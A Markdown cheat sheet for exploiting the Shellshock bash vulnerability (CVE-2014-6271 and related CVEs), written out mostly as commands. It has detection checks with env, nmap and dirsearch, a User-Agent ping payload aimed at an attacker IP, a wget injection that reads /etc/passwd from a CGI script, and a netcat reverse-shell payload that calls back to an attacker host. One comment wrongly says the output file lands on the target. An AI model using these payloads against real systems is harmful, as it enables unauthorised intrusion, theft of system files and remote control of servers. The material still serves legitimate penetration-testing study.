# Shellshock
##### Test for Shellshock Vulneratbility
```bash
env x='() { :;}; echo vulnerable' bash -c "echo this is a test"

# Create environment variable x of function () { :;};
# "echo vulnerable" is outside of the variable x funtion.
# If bash echoes "vulnerable," it is vulnerable.
# If it echoes "this is a test," it is not vulnerable.
```

##### Test for Shellshock Vulneratbility using User-Agent
```bash
User-Agent = () { :;}; ping -c 5 -p "Test String" <Attacker IP Address>
```

##### Test for Shellshock Vulneratbility using CGI
```bash
# Find *.cgi programs on target
./dirsearch.py -u http://<IP Address> -e cgi -r
# Assume returns /cgi-bin/login.cgi

nmap --script http-shellshock --script-args uri=/cgi-bin/login.cgi <IP Address> -p 80
```

##### Attack Shellshock
```bash
# Assuming dirsearch returns /cgi-bin/login.cgi

wget -U "() { foo; }; echo \"Content-Type: text/plain\"; echo; echo; /bin/cat /etc/passwd" http://<IP Address>/cgi-bin/login.cgi && cat login.cgi
# Makes HTTP request, setting User-Agent (-U) to the string.
# It creates a local file, login.cgi, on the target, and cats the file.
```

##### Establish Reverse Shell with Shellshock
```bash
# Assuming dirsearch returns /cgi-bin/login.cgi

wget -U "() { foo; }; echo; /bin/nc <Attacker IP Address> <Listening Port> -e /bin/sh" http://<IP Address>/cgi-bin/login.cgi
# Makes HTTP request, setting User-Agent (-U) to the string.
```

# References
[Bash (Unix shell)](https://en.wikipedia.org/wiki/Bash_(Unix_shell))

# Shellshock References
[Shellshock](https://en.wikipedia.org/wiki/Shellshock_(software_bug))

[CVE-2014-6271](https://en.wikipedia.org/wiki/Shellshock_(software_bug)#Initial_report_(CVE-2014-6271))

[CVE-2014-6277](https://en.wikipedia.org/wiki/Shellshock_(software_bug)#CVE-2014-6277)

[CVE-2014-6278](https://en.wikipedia.org/wiki/Shellshock_(software_bug)#CVE-2014-6278)

[CVE-2014-7169](https://en.wikipedia.org/wiki/Shellshock_(software_bug)#CVE-2014-7169)

[CVE-2014-7186](https://en.wikipedia.org/wiki/Shellshock_(software_bug)#CVE-2014-7186)

[CVE-2014-7187](https://en.wikipedia.org/wiki/Shellshock_(software_bug)#CVE-2014-7187)

[nmap http-shellshock](https://nmap.org/nsedoc/scripts/http-shellshock.html)